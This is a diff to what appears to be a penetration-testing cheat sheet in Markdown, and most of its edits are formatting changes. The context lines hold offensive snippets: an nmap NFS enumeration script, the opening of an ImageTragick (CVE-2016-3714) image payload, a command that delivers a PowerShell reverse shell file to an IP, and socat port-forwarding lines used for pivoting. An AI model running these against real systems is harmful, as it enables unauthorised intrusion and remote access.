@@ -13,7 +13,8 @@ export TERM=xterm
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
 ```
-CVE-2016–3714
+
+#### CVE-2016–3714
 
 ```
 cat > image.png << EOF
@@ -46,11 +47,11 @@ python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
 ```
 
 #### Decompress a gzip file:
-```
+```sh
 gzip -d file.gz
 ```
 #### Change file without vim or nano
-```
+```sh
 cat > file << EOF 
 ....
 EOF
@@ -79,7 +80,6 @@ tree tmp
 
 #### socat if open port
 ```python
-./socat tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
 ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
 ```
 
